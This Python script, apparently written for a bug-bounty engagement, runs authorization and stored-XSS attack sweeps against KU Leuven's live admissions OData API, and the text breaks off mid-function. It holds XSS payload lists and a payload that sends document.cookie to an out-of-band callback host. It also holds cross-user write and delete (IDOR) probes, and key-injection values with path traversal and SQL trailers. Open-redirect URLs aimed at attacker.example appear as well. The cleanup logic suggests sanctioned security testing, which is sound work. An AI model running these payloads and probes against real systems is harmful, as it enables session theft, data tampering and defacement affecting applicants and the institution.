#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KU Leuven Admissions — Track E — sweeps 9-14 (post-bundle-analysis authz tests)
=================================================================================

Follows VM-BRIEF-track-e-sweep9-post-bundle.md. Reuses authz_matrix's Client,
Session, MatrixLogger, and scope/target-id/PII guards — everything below runs
under the same guardrails as Track B.

Sweeps:
    9  — S9-M3 LongTexts full write-authz matrix (CROWN JEWEL)
   10  — S9-C1 collection-write-via-singleton-key IDOR
   11  — S9-P1 appFeePayURL and other Sweep-1-missed priv fields
   12  — S9-V1 OrganisationCustomisations image/label writes
   13  — Doctoral supervisor + missed free-text sinks
   14  — one-GET verifications (in-scope only)

Usage:
    # sanity-check reachability + session then plan:
    python3 track_e.py --check
    python3 track_e.py --dry-run --sweeps 9

    # live crown-jewel run:
    python3 track_e.py --sweeps 9 --append

    # everything, live:
    python3 track_e.py --sweeps 9,10,11,12,13,14 --append \\
                       --oob-host 'xxxxxxxx.oast.online'

The --oob-host is used only inside sweep 9.7's submitInfo persistence probe
(one payload cycle). Cleanup NEVER uses the OOB host, so callback attribution
stays unambiguous.
"""
import argparse
import json
import os
import re
import sys
import time
import urllib.parse
import urllib.request
import urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m  # noqa: E402

# ---------------------------------------------------------------------------
# The full LongText property set we know the client reads (grepped from
# controllers/views/fragments). Used as the write matrix when the live
# $metadata pass in sweep 9.1 fails or is unreachable.
# ---------------------------------------------------------------------------
LONGTEXT_CLIENT_READ_PROPS = sorted([
    "followUpAdmLetter", "followUpQuestionnair", "fotoTekst", "frisInfo",
    "geslachtInfo", "infoText", "locatieKnop", "locatieTitel", "onlineKnop",
    "onlineTekst", "onlineTitel", "opKotInfo", "opKotNiet", "opKotWel",
    "payDisclaimer", "roepNaamInfo", "statusOmschrijving", "submitInfo",
    "submitVinkje",
] + [f"status{n}" for n in [
    101, 102, 103, 104, 105, 106, 107,
    201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212,
    213, 214, 215, 216, 217, 218, 219, 220,
    901, 902, 903, 904, 905, 906, 907,
]])

# Properties Track D §1 confirmed render via an HTML sink somewhere in the UI
# (FormattedText htmlText, MessageStrip enableFormattedText, or Link href).
# These are the highest-EV targets for the write-authz + render chain.
LONGTEXT_HTMLSINK_PROPS = [
    "infoText",            # Main.view — htmlText
    "submitVinkje",        # ApplicationDetail — htmlText (disclaimer)
    "payDisclaimer",       # ApplicationDetailPay — htmlText
    "submitInfo",          # ApplicationDetail — Link href="{teksten>/submitInfo}" target="_blank"
    "statusOmschrijving",  # ApplicationDetail — htmlText
    "onlineTekst",         # ApplicationDetail — htmlText
    "locatieTitel",        # ApplicationDetail — htmlText
    "opKotInfo",           # ApplicationStay — htmlText
    "opKotWel", "opKotNiet",  # ApplicationStay — MessageStrip enableFormattedText
    "followUpAdmLetter", "followUpQuestionnair",  # ApplicationDetail — htmlText
    "roepNaamInfo", "geslachtInfo",  # PersInf controller-side setHtmlText
    "fotoTekst",           # Main controller-side setHtmlText on picture editor
]

# LongText keys we know from the client. Composite `<lang>|<inst>|<year|appId>`.
def longtext_key(lang, inst, tail):
    return f"{lang}|{inst}|{tail}"


# XSS payload set (Sweep 9.3). Marker `KLXSSPROBE_LT` is our exclusive
# marker — never used elsewhere in the codebase — so a grep of any downstream
# response body for that string is a positive persistence signal.
def payloads(oob_host=None):
    p = [
        ("classic_img_onerror",  "<img src=x onerror=alert(1)>KLXSSPROBE_LT"),
        ("script_tag",           "<script>alert(1)</script>KLXSSPROBE_LT"),
        ("svg_onload",           "<svg onload=alert(1)>KLXSSPROBE_LT"),
        ("a_href_js",            '<a href="javascript:alert(1)">click</a>KLXSSPROBE_LT'),
        ("style_import_js",      "<style>@import 'javascript:alert(1)'</style>KLXSSPROBE_LT"),
        ("plain_marker",         "KLXSSPROBE_LT_plain"),
        ("whitespace_variant",   "<img\tsrc=x\tonerror=alert(1)>KLXSSPROBE_LT"),
        ("html_entity_encoded",  "&lt;img src=x onerror=alert(1)&gt;KLXSSPROBE_LT"),
    ]
    if oob_host:
        p.append(("oob_img_fetch",
                  f"<img src=x onerror=fetch('//{oob_host}/?p='+document.location)>KLXSSPROBE_LT"))
    return p


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def gather_row_props(text):
    """From an OData v2 JSON body, return dict of top-level fields under d.
    Falls back to empty dict on parse failure."""
    if not text:
        return {}
    try:
        obj = json.loads(text)
    except Exception:
        return {}
    d = obj.get("d") if isinstance(obj, dict) else None
    if isinstance(d, dict):
        # Some OData v2 wrappers put fields directly under d; others under d.results[0]
        if "results" in d and isinstance(d["results"], list) and d["results"]:
            return {k: v for k, v in d["results"][0].items() if not k.startswith("__")}
        return {k: v for k, v in d.items() if not k.startswith("__")}
    return {}


def restore_field(client, session, entity_path, field, baseline_value, logger, sweep):
    """MERGE the field back to baseline_value (skipping None which OData can't
    always accept as an explicit null). Log the restore + a verify readback."""
    if baseline_value is None:
        bv = ""
    else:
        bv = baseline_value
    r = m.merge(client, session, entity_path, {field: bv}, logger, sweep,
                f"RESTORE {field}={bv!r}", extra_flags=["restore"])
    verify = m.read_entity(client, session, entity_path, logger, sweep,
                           f"verify restore {field}")
    now = m.json_field(verify.get("text", ""), field)
    ok = (now == baseline_value) or (str(now) == str(baseline_value))
    logger.log(sweep, entity_path, "RESTORE_VERIFY", f"{field} ok={ok}",
               {"status": "n/a", "text": ""},
               [f"cleanup_ok={ok}", f"was={baseline_value!r}", f"now={now!r}"])
    return ok


# ---------------------------------------------------------------------------
# SWEEP 9 — LongTexts write-authz matrix (CROWN JEWEL)
# ---------------------------------------------------------------------------
def sweep_9(client, sessions, logger, oob_host=None):
    """Sweep 9 runs in two stages to keep the request budget bounded on the
    live target:

      Stage 1 — 'signal' pass: 6 top-EV HTML-sink props × 3 top-EV keys × 2
                payloads (classic marker + plain marker) ≈ 36 MERGEs. If none
                accept, the server enforces uniform write-authz on LongTexts;
                emit CLEAN NEGATIVE and skip stage 2.

      Stage 2 — 'characterization' pass: full property × key × payload matrix,
                but with per-prop early-exit (after 3 consecutive 403s on the
                same prop, skip remaining payloads for that prop).

    Between stages 1 and 2 we already know whether the server accepts writes;
    stage 2 exists only to characterize the boundary (which payload variants,
    which properties, which keys).
    """
    sA = sessions["A"]
    sB = sessions["B"]
    inst_A = "50000050"  # KU Leuven main institution seen throughout the client
    app_A = m.ACCT["A"]["application"]
    app_B = m.ACCT["B"]["application"]

    # ------ 9.1 discover property surface ---------------------------------
    props_from_metadata = _discover_longtext_properties(client, sA, logger)
    all_props = sorted(set(LONGTEXT_CLIENT_READ_PROPS) | props_from_metadata)
    logger.log("9", "LongText", "NOTE", "property inventory",
               {"status": "n/a", "text": ""},
               [f"from_metadata={sorted(props_from_metadata)[:12]}...",
                f"from_client_refs={len(LONGTEXT_CLIENT_READ_PROPS)}",
                f"total_unique={len(all_props)}"])

    # ------ 9.2 baseline captures -----------------------------------------
    baseline_keys = [
        longtext_key("EN", inst_A, "2020"),
        longtext_key("NL", inst_A, "2020"),
        longtext_key("EN", inst_A, app_A),
        longtext_key("NL", inst_A, app_A),
    ]
    baselines_A = {}
    for k in baseline_keys:
        entity = f"LongTexts('{k}')"
        r = m.read_entity(client, sA, entity, logger, "9", f"S9.2 baseline A {k}")
        baselines_A[k] = gather_row_props(r.get("text", ""))
    baselines_B = {}
    for k in baseline_keys:
        entity = f"LongTexts('{k}')"
        r = m.read_entity(client, sB, entity, logger, "9", f"S9.2 baseline B {k}")
        baselines_B[k] = gather_row_props(r.get("text", ""))

    _save_baselines("intigriti/kuleuven_admissions/vm-results/03-sweep9-baselines.json",
                    {"A": baselines_A, "B": baselines_B})

    high_ev_key = longtext_key("EN", inst_A, "2020")
    target_keys = [
        (high_ev_key, "own inst, static year, EN"),
        (longtext_key("EN", inst_A, app_A), "own inst + own app"),
        (longtext_key("NL", inst_A, "2020"), "own inst, static year, NL"),
        (longtext_key("NL", inst_A, app_A), "own inst + own app, NL"),
        (longtext_key("EN", inst_A, "2099"), "own inst, future year"),
        (longtext_key("EN", inst_A, app_B), "own inst + B's app (CROSS-USER)"),
        (longtext_key("EN", "50000051", "2020"), "made-up inst (50000051)"),
    ]
    all_payloads = payloads(oob_host=None)  # OOB reserved for 9.7 only
    stage1_payloads = [p for p in all_payloads
                       if p[0] in ("classic_img_onerror", "plain_marker")]
    stage1_props = LONGTEXT_HTMLSINK_PROPS[:6]
    stage1_keys = target_keys[:3]

    # ---- Stage 1: signal pass --------------------------------------------
    any_hit = False
    for target_key, key_note in stage1_keys:
        entity = f"LongTexts('{target_key}')"
        r = m.read_entity(client, sA, entity, logger, "9",
                          f"S9.3 stage1 pre-write {key_note}")
        pre_state = gather_row_props(r.get("text", ""))
        for prop in stage1_props:
            baseline_val = pre_state.get(prop)
            for pname, pval in stage1_payloads:
                variant = f"[stage1] MERGE {prop}={pname} @ {key_note}"
                try:
                    rw = m.merge(client, sA, entity, {prop: pval}, logger, "9", variant)
                    r2 = m.read_entity(client, sA, entity, logger, "9",
                                       f"[stage1] re-read {prop} @ {key_note}")
                    now = m.json_field(r2.get("text", ""), prop)
                    persisted = (now == pval) and (now != baseline_val)
                    flags = [f"before={baseline_val!r}", f"after={now!r}",
                             f"persisted={persisted}",
                             f"write_status={rw.get('status')}"]
                    if persisted:
                        any_hit = True
                        flags.append("ANOMALY_longtexts_write_persisted")
                    logger.log("9", entity, "COMPARE",
                               f"[stage1] {prop}[{pname}] @ {key_note}",
                               {"status": "n/a", "text": ""}, flags)
                finally:
                    if baseline_val is not None:
                        restore_field(client, sA, entity, prop, baseline_val,
                                      logger, "9")

    logger.log("9", "LongTexts", "NOTE", "S9.3 stage-1 verdict",
               {"status": "n/a", "text": ""},
               [f"any_hit={any_hit}", "class=stage1_summary"])

    if not any_hit:
        # Stage 2 would just re-confirm; skip it to respect the live target.
        logger.log("9", "LongTexts", "NOTE",
                   "S9.3 skipping stage 2 — stage 1 was clean negative",
                   {"status": "n/a", "text": ""}, ["class=stage2_skipped"])
    else:
        # ---- Stage 2: characterization pass ------------------------------
        ordered_props = [p for p in LONGTEXT_HTMLSINK_PROPS if p in all_props] + \
                        [p for p in all_props if p not in LONGTEXT_HTMLSINK_PROPS]
        for target_key, key_note in target_keys:
            entity = f"LongTexts('{target_key}')"
            r = m.read_entity(client, sA, entity, logger, "9",
                              f"[stage2] pre-write {key_note}")
            pre_state = gather_row_props(r.get("text", ""))
            for prop in ordered_props:
                baseline_val = pre_state.get(prop)
                consecutive_403 = 0
                for pname, pval in all_payloads:
                    variant = f"[stage2] MERGE {prop}={pname} @ {key_note}"
                    try:
                        rw = m.merge(client, sA, entity, {prop: pval}, logger,
                                     "9", variant)
                        st = rw.get("status")
                        if st == 403:
                            consecutive_403 += 1
                        else:
                            consecutive_403 = 0
                        r2 = m.read_entity(client, sA, entity, logger, "9",
                                           f"[stage2] re-read {prop}")
                        now = m.json_field(r2.get("text", ""), prop)
                        persisted = (now == pval) and (now != baseline_val)
                        flags = [f"before={baseline_val!r}", f"after={now!r}",
                                 f"persisted={persisted}"]
                        if persisted:
                            flags.append("ANOMALY_longtexts_write_persisted")
                        logger.log("9", entity, "COMPARE",
                                   f"[stage2] {prop}[{pname}] @ {key_note}",
                                   {"status": "n/a", "text": ""}, flags)
                    finally:
                        if baseline_val is not None:
                            restore_field(client, sA, entity, prop, baseline_val,
                                          logger, "9")
                    if consecutive_403 >= 3:
                        # Property is uniformly rejected — no more payloads for it
                        break

    # ------ 9.4 method-spoofing on the highest-EV target ------------------
    method_probes = [
        ("PUT", None, "PUT instead of MERGE"),
        ("POST", "atom+xml", "POST full-entity create"),
        ("MERGE", "X-HTTP-Method-Override:MERGE", "explicit method-override header"),
        ("MERGE", "no-csrf", "MERGE without x-csrf-token"),
        ("POST", "$batch-changeset", "batch changeset with MERGE inside"),
    ]
    highest = longtext_key("EN", inst_A, "2020")
    entity = f"LongTexts('{highest}')"
    for method, tweak, note in method_probes:
        variant = f"S9.4 {note}"
        try:
            if tweak == "atom+xml":
                # A skeletal atom entry — most SAP OData v2 servers reject
                # unless a full metadata namespace is present. Purpose is to
                # detect any code path that accepts client-composed keys.
                body = (
                    '<?xml version="1.0"?><entry xmlns="http://www.w3.org/2005/Atom" '
                    'xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices" '
                    'xmlns:m="http://schemas.microsoft.com/ado/2007/08/dataservices/metadata">'
                    f'<content type="application/xml"><m:properties>'
                    f'<d:lang>EN</d:lang><d:instelling>{inst_A}</d:instelling>'
                    f'<d:tail>2020</d:tail><d:infoText>KLTEST_S94_POST</d:infoText>'
                    '</m:properties></content></entry>'
                ).encode()
                r = client.request(sA, "POST", "LongTexts", body=body,
                                   extra_headers={"Content-Type":
                                                  "application/atom+xml;type=entry"},
                                   note=variant)
                logger.log("9", "LongTexts", "POST", variant, r,
                           [f"status={r.get('status')}"])
            elif tweak == "$batch-changeset":
                body, boundary = m._batch_body(
                    [], changeset=[("MERGE", "/" + entity, {"infoText": "KLTEST_S94_BATCH"})])
                r = client.request(sA, "POST", "$batch", body=body,
                                   extra_headers={"Content-Type":
                                                  f"multipart/mixed; boundary={boundary}"},
                                   note=variant)
                inners = m._parse_batch_inner_statuses(r.get("text", ""))
                logger.log("9", "$batch", "POST", variant, r,
                           [f"outer={r.get('status')}", f"inners={inners}"])
            elif tweak == "no-csrf":
                r = m.merge(client, sA, entity, {"infoText": "KLTEST_S94_NOCSRF"},
                            logger, "9", variant, omit_csrf=True)
            elif tweak and tweak.startswith("X-HTTP"):
                # A MERGE with explicit override header on a POST
                r = client.request(sA, "POST", entity,
                                   body=json.dumps({"infoText": "KLTEST_S94_OVERRIDE"}).encode(),
                                   extra_headers={"Content-Type": "application/json",
                                                  "X-HTTP-Method-Override": "MERGE",
                                                  "x-csrf-token": sA.csrf or "Fetch"},
                                   note=variant)
                logger.log("9", entity, "POST", variant, r,
                           [f"status={r.get('status')}"])
            else:
                # plain PUT
                r = client.request(sA, "PUT", entity,
                                   body=json.dumps({"infoText": "KLTEST_S94_PUT"}).encode(),
                                   extra_headers={"Content-Type": "application/json",
                                                  "x-csrf-token": sA.csrf or "Fetch"},
                                   note=variant)
                logger.log("9", entity, "PUT", variant, r,
                           [f"status={r.get('status')}"])
        finally:
            # Always try to restore infoText if we may have written it
            base_info = baselines_A.get(highest, {}).get("infoText")
            if base_info is not None:
                restore_field(client, sA, entity, "infoText", base_info, logger, "9")

    # ------ 9.5 composite-key parsing probes ------------------------------
    key_variants = [
        f"EN|{inst_A}|2020|attacker=1",      # trailing garbage
        f"EN|{inst_A}|2020%7Cx",             # URL-encoded pipe
        f"EN||2020",                         # empty inst
        f"EN|{inst_A}|2020%00attacker",      # NUL byte trailing
        f"EN|{inst_A}|2020;--",              # SQL-flavored trailer
        f"EN|{inst_A}|../../etc/passwd",     # path traversal in key
        f"EN|{inst_A}|{app_B}",              # cross-app tail (already in 9.3 grid but
                                             # re-emit under this bucket for clarity)
    ]
    for k in key_variants:
        entity = f"LongTexts('{k}')"
        variant = f"S9.5 key-variant '{k}'"
        try:
            r = m.read_entity(client, sA, entity, logger, "9", variant)
        except Exception as e:
            logger.log("9", entity, "GET-ERR", variant,
                       {"status": "ERR", "text": str(e)[:100]}, [])

    # ------ 9.6 cross-user render check -----------------------------------
    # For every high-EV key, do a B-session read AFTER the 9.3 grid ran.
    for key in baseline_keys:
        entity = f"LongTexts('{key}')"
        r = m.read_entity(client, sB, entity, logger, "9", f"S9.6 B-session read {key}")
        body = r.get("text", "") or ""
        marker_hit = "KLXSSPROBE_LT" in body
        onerror_hit = "onerror=" in body
        flags = [f"B_status={r.get('status')}",
                 f"KLXSSPROBE_LT_in_B={marker_hit}",
                 f"onerror_in_B={onerror_hit}"]
        if marker_hit or onerror_hit:
            flags.append("ANOMALY_cross_user_render_confirmed")
        logger.log("9", entity, "CROSS-USER-CHECK",
                   f"B-session verify {key}", {"status": "n/a", "text": ""}, flags)

    # ------ 9.7 submitInfo Link-href probe -------------------------------
    _sweep_9_7_submitinfo(client, sessions, logger, oob_host, baselines_A)

    # ------ 9.8 cleanup verification --------------------------------------
    # Any field that got restored is already verified inline. Emit a final
    # tally row so the summary regenerator can highlight if any restore failed.
    logger.log("9", "LongTexts", "NOTE", "S9.8 cleanup done — inline verified per-write",
               {"status": "n/a", "text": ""}, ["cleanup_class=inline"])


def _sweep_9_7_submitinfo(client, sessions, logger, oob_host, baselines_A):
    sA = sessions["A"]
    sB = sessions["B"]
    inst_A = "50000050"
    app_A = m.ACCT["A"]["application"]
    key = longtext_key("EN", inst_A, app_A)
    entity = f"LongTexts('{key}')"
    baseline_val = baselines_A.get(key, {}).get("submitInfo")
    # 9.7 uses OOB — this is the ONLY sweep where the interactsh domain is used.
    payloads = [("submitInfo_js_alert", "javascript:alert('KLPROBE_S97')")]
    if oob_host:
        payloads.append(
            ("submitInfo_js_oob",
             f"javascript:fetch('//{oob_host}/?p='+document.cookie)"))
    for name, val in payloads:
        variant = f"S9.7 MERGE submitInfo = {name}"
        try:
            m.merge(client, sA, entity, {"submitInfo": val}, logger, "9", variant)
            r = m.read_entity(client, sA, entity, logger, "9", f"S9.7 re-read A {name}")
            now = m.json_field(r.get("text", ""), "submitInfo")
            persisted = (now == val)
            logger.log("9", entity, "COMPARE",
                       f"S9.7 submitInfo[{name}]", {"status": "n/a", "text": ""},
                       [f"before={baseline_val!r}", f"after={now!r}",
                        f"persisted={persisted}"] +
                       (["ANOMALY_submitInfo_persisted"] if persisted else []))
            if persisted:
                # cross-user render check on submitInfo specifically
                rB = m.read_entity(client, sB, entity, logger, "9",
                                   f"S9.7 B-session read {name}")
                bt = rB.get("text", "") or ""
                logger.log("9", entity, "CROSS-USER-CHECK",
                           f"S9.7 B sees {name}",
                           {"status": "n/a", "text": ""},
                           [f"B_status={rB.get('status')}",
                            f"payload_in_B={('KLPROBE_S97' in bt or 'javascript:' in bt)}"])
        finally:
            restore_field(client, sA, entity, "submitInfo", baseline_val, logger, "9")


def _discover_longtext_properties(client, session, logger):
    """Try to GET $metadata and parse the LongText EntityType's <Property>
    names. Returns a set (possibly empty on any failure — the client-referenced
    property list is still available as fallback in the caller)."""
    try:
        r = client.request(session, "GET", "$metadata",
                           extra_headers={"Accept": "application/xml"},
                           note="S9.1 $metadata")
    except Exception as e:
        logger.log("9", "$metadata", "GET-ERR", "S9.1 metadata fetch failed",
                   {"status": "ERR", "text": str(e)[:100]}, [])
        return set()
    txt = r.get("text", "") or ""
    logger.log("9", "$metadata", "GET", "S9.1 metadata fetch", r,
               [f"len={len(txt)}"])
    # crude but sufficient: find the block for EntityType Name="LongText"
    props = set()
    block = re.search(r'<EntityType\s+[^>]*Name="LongText"[^>]*>(.*?)</EntityType>',
                      txt, re.S | re.I)
    if block:
        for pm in re.finditer(r'<Property\s+[^>]*Name="([A-Za-z0-9_]+)"', block.group(1)):
            props.add(pm.group(1))
    return props


def _save_baselines(path, obj):
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(obj, fh, ensure_ascii=False, indent=2)


# ---------------------------------------------------------------------------
# SWEEP 10 — collection-write-via-singleton-key IDOR
# ---------------------------------------------------------------------------
def sweep_10(client, sessions, logger):
    sA = sessions["A"]
    sB = sessions["B"]

    # ------ 10.1 baseline enumeration -------------------------------------
    endpoints = [
        ("HigherEducations", "Curriculums('0')/HigherEducations", "higherEducationId"),
        ("Interrupts",       "Curriculums('0')/Interrupts",       "interruptedId"),
        ("LanguageKnowledges","Languages('0')/LanguageKnowledges", "language"),
    ]
    baselines = {}
    for label, path, id_field in endpoints:
        rA = m.read_entity(client, sA, path, logger, "10",
                           f"S10.1 baseline A {label}")
        rB = m.read_entity(client, sB, path, logger, "10",
                           f"S10.1 baseline B {label}")
        baselines[label] = {
            "A_rows": _extract_rows(rA.get("text", ""), id_field),
            "B_rows": _extract_rows(rB.get("text", ""), id_field),
            "id_field": id_field,
            "path": path,
        }
        logger.log("10", label, "NOTE", f"S10.1 A={len(baselines[label]['A_rows'])}"
                   f" B={len(baselines[label]['B_rows'])} rows",
                   {"status": "n/a", "text": ""}, [])

    # ------ 10.2 own-row baseline MERGE (control) -------------------------
    for label, path, id_field in endpoints:
        rows_A = baselines[label]["A_rows"]
        if not rows_A:
            continue
        row = rows_A[0]
        entity = _singleton_write_entity(label)
        variant = f"S10.2 control MERGE own row {label}"
        try:
            # send back the row's own id + one benign field (marker via `nameSchool`
            # for HigherEducations; `interruptedReasonOther` for Interrupts; etc.)
            marker = f"KLTEST_S10_2_{label[:3]}"
            body = {id_field: row[id_field]}
            body.update(_benign_marker_field(label, marker))
            m.merge(client, sA, entity, body, logger, "10", variant)
            after = m.read_entity(client, sA, baselines[label]["path"], logger, "10",
                                  f"S10.2 verify {label}")
            hits = _row_field_hits(after.get("text", ""), id_field, row[id_field],
                                   _benign_marker_field(label, marker))
            logger.log("10", entity, "COMPARE", variant,
                       {"status": "n/a", "text": ""},
                       [f"marker_present={hits}",
                        f"row_id={row[id_field]!r}"])
        finally:
            _restore_row(client, sA, baselines[label]["path"], entity, id_field,
                         row, logger, "10", label)

    # ------ 10.3 attacker-chosen new id (create-via-MERGE) ---------------
    for label, path, id_field in endpoints:
        entity = _singleton_write_entity(label)
        attacker_id = _synth_id(baselines[label]["A_rows"] + baselines[label]["B_rows"], id_field)
        marker = f"KLTEST_S10_3_{label[:3]}"
        variant = f"S10.3 create-via-MERGE attacker id={attacker_id!r} {label}"
        body = {id_field: attacker_id}
        body.update(_benign_marker_field(label, marker))
        try:
            m.merge(client, sA, entity, body, logger, "10", variant)
            afterA = m.read_entity(client, sA, path, logger, "10",
                                   f"S10.3 verify A {label}")
            afterB = m.read_entity(client, sB, path, logger, "10",
                                   f"S10.3 verify B {label}")
            created_in_A = _row_exists(afterA.get("text", ""), id_field, attacker_id)
            appears_in_B = _row_exists(afterB.get("text", ""), id_field, attacker_id)
            flags = [f"created_in_A={created_in_A}",
                     f"appears_in_B={appears_in_B}",
                     f"attacker_id={attacker_id!r}"]
            if appears_in_B:
                flags.append("ANOMALY_cross_user_row_visible")
            logger.log("10", entity, "COMPARE", variant,
                       {"status": "n/a", "text": ""}, flags)
        finally:
            if _row_exists_via_recheck(client, sA, path, id_field, attacker_id):
                _delete_row_best_effort(client, sA, label, id_field, attacker_id,
                                        logger)

    # ------ 10.4 cross-user write via body id -----------------------------
    for label, path, id_field in endpoints:
        rows_B = baselines[label]["B_rows"]
        if not rows_B:
            continue
        target_id = rows_B[0][id_field]
        entity = _singleton_write_entity(label)
        marker = f"KLTEST_S10_4_{label[:3]}_CROSS"
        variant = f"S10.4 CROSS-USER MERGE {label} body-id={target_id!r}"
        try:
            body = {id_field: target_id}
            body.update(_benign_marker_field(label, marker))
            m.merge(client, sA, entity, body, logger, "10", variant)
            # verify from B — did B's row change?
            afterB = m.read_entity(client, sB, path, logger, "10",
                                   f"S10.4 verify B {label}")
            hit = _row_field_hits(afterB.get("text", ""), id_field, target_id,
                                  _benign_marker_field(label, marker))
            flags = [f"target_id={target_id!r}", f"marker_reached_B={hit}"]
            if hit:
                flags.append("ANOMALY_cross_user_write_persisted")
            logger.log("10", entity, "COMPARE", variant,
                       {"status": "n/a", "text": ""}, flags)
        finally:
            # restore B's row (from B's own session — the safe path)
            _restore_row(client, sB, baselines[label]["path"], entity, id_field,
                         rows_B[0], logger, "10", label)

    # ------ 10.5 DELETE via singleton (unused-by-client path) ------------
    for label, _, id_field in endpoints:
        entity = _singleton_write_entity(label)
        variant = f"S10.5 DELETE singleton {label}"
        try:
            r = client.request(sA, "DELETE", entity, note=variant)
            logger.log("10", entity, "DELETE", variant, r,
                       [f"status={r.get('status')}"])
            # verify list from A
            after = m.read_entity(client, sA, baselines[label]["path"], logger, "10",
                                  f"S10.5 verify list {label}")
            rows_now = _extract_rows(after.get("text", ""), id_field)
            deleted_count = len(baselines[label]["A_rows"]) - len(rows_now)
            logger.log("10", entity, "COMPARE", variant,
                       {"status": "n/a", "text": ""},
                       [f"rows_before={len(baselines[label]['A_rows'])}",
                        f"rows_after={len(rows_now)}",
                        f"deleted={deleted_count}"])
        except Exception as e:
            logger.log("10", entity, "DELETE-ERR", variant,
                       {"status": "ERR", "text": str(e)[:100]}, [])
        # NOTE: no automatic re-create on DELETE — that requires POST-create
        # which we probe below and would compose over an unknown authz surface.
        # If DELETE removed rows, human must review + POST-create individually.

    # ------ 10.6 POST-create -----------------------------------------------
    for label, path, id_field in endpoints:
        entity = _singleton_write_entity(label)  # POST goes to the collection, not the singleton
        collection = label  # collection name at OData root
        attacker_id = f"KL{label[:2].upper()}TEST"
        marker = f"KLTEST_S10_6_{label[:3]}"
        variant = f"S10.6 POST-create {collection} id={attacker_id}"
        try:
            body = {id_field: attacker_id}
            body.update(_benign_marker_field(label, marker))
            r = client.request(sA, "POST", collection,
                               body=json.dumps(body).encode(),
                               extra_headers={"Content-Type": "application/json",
                                              "x-csrf-token": sA.csrf or "Fetch"},
                               note=variant)
            logger.log("10", collection, "POST", variant, r,
                       [f"status={r.get('status')}"])
            after = m.read_entity(client, sA, path, logger, "10",
                                  f"S10.6 verify A {label}")
            afterB = m.read_entity(client, sB, path, logger, "10",
                                   f"S10.6 verify B {label}")
            flags = [f"in_A={_row_exists(after.get('text',''), id_field, attacker_id)}",
                     f"in_B={_row_exists(afterB.get('text',''), id_field, attacker_id)}"]
            logger.log("10", collection, "COMPARE", variant,
                       {"status": "n/a", "text": ""}, flags)
        finally:
            if _row_exists_via_recheck(client, sA, path, id_field, attacker_id):
                _delete_row_best_effort(client, sA, label, id_field, attacker_id,
                                        logger)


def _extract_rows(text, id_field):
    """Return list of dicts from an OData collection response, keyed on id_field."""
    if not text:
        return []
    try:
        obj = json.loads(text)
    except Exception:
        return []
    d = obj.get("d") if isinstance(obj, dict) else None
    if isinstance(d, dict) and "results" in d:
        return [r for r in d["results"] if isinstance(r, dict) and id_field in r]
    if isinstance(d, dict) and id_field in d:
        return [d]
    return []


def _row_exists(text, id_field, id_value):
    for r in _extract_rows(text, id_field):
        if str(r.get(id_field)) == str(id_value):
            return True
    return False


def _row_field_hits(text, id_field, id_value, marker_fields):
    """Check whether the row with id_value contains any of marker_fields' key=value."""
    for r in _extract_rows(text, id_field):
        if str(r.get(id_field)) != str(id_value):
            continue
        for k, v in marker_fields.items():
            if str(r.get(k)) == str(v):
                return True
    return False


def _row_exists_via_recheck(client, session, path, id_field, id_value):
    r = client.request(session, "GET", path, note=f"row-recheck {id_value}")
    return _row_exists(r.get("text", ""), id_field, id_value)


def _delete_row_best_effort(client, session, label, id_field, id_value, logger):
    """Try both singleton DELETE and composite-key DELETE. Log outcome."""
    for entity in [f"{label}('{id_value}')", f"{label}({id_field}='{id_value}')"]:
        try:
            r = client.request(session, "DELETE", entity,
                               note=f"cleanup-delete {entity}")
            logger.log("10", entity, "DELETE", "cleanup-delete", r,
                       [f"status={r.get('status')}", "cleanup"])
            if r.get("status") in (200, 204):
                return
        except Exception as e:
            logger.log("10", entity, "DELETE-ERR", "cleanup-delete",
                       {"status": "ERR", "text": str(e)[:100]}, ["cleanup"])


def _singleton_write_entity(label):
    return f"{label}('0')"


def _benign_marker_field(label, marker):
    """Return a payload of ONE benign field per entity — the field the row
    exposes as free-text (per bundle-read § services.js)."""
    return {
        "HigherEducations": {"nameSchool": marker},
        "Interrupts": {"interruptedReasonOther": marker},
        "LanguageKnowledges": {"speaking": marker[:1]},  # know knowledge char
    }.get(label, {"note": marker})


def _synth_id(existing_rows, id_field):
    """Return an integer-shaped id that doesn't collide with any existing row."""
    used = set()
    for r in existing_rows:
        try:
            used.add(int(r[id_field]))
        except Exception:
            pass
    n = 99000
    while n in used:
        n += 1
    return f"{n:05d}"


def _restore_row(client, session, path, entity, id_field, baseline_row, logger,
                 sweep, label):
    """MERGE the baseline_row values back on the singleton write entity."""
    body = {id_field: baseline_row[id_field]}
    body.update(_benign_marker_field(label, ""))  # blank marker to overwrite
    m.merge(client, session, entity, body, logger, sweep,
            f"RESTORE {label} {id_field}={baseline_row[id_field]!r}",
            extra_flags=["restore"])


# ---------------------------------------------------------------------------
# SWEEP 11 — appFeePayURL + Sweep-1 gap-fill
# ---------------------------------------------------------------------------
S11_FIELDS = [
    ("appFeePayURL", [
        "http://attacker.example/pay",
        "//attacker.example/",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "https://webwsp.aps.kuleuven.be@attacker.example/",
        "https://webwsp.aps.kuleuven.be.attacker.example/",
    ]),
    ("followUpQuestionnair", ["<img src=x onerror=alert(1)>", "KLTEST_S11"]),
    ("submitVinkje", [True, "KLTEST_S11_VN"]),
    ("templateMergeContent", ["KLTEST_S11_TMC"]),
    ("caseAdmin", ["HACKER"]),  # Sweep 1 tested this in a mixed body — retry isolated
]


def sweep_11(client, sessions, logger):
    sA = sessions["A"]
    ent = f"Applications('{m.ACCT['A']['application']}')"
    base = m.read_entity(client, sA, ent, logger, "11", "S11 baseline read")
    baseline = {f: m.json_field(base.get("text", ""), f) for f, _ in S11_FIELDS}
    logger.log("11", ent, "NOTE", "S11 baseline",
               {"status": "n/a", "text": ""}, [f"baseline={baseline}"])
    try:
        for field, values in S11_FIELDS:
            for val in values:
                variant = f"S11 MERGE {field}={val!r} (isolated)"
                m.merge(client, sA, ent, {field: val}, logger, "11", variant)
                after = m.read_entity(client, sA, ent, logger, "11",
                                      f"re-read after {field}={val!r}")
                now = m.json_field(after.get("text", ""), field)
                persisted = (now == val) and (now != baseline[field])
                flags = [f"before={baseline[field]!r}", f"after={now!r}",
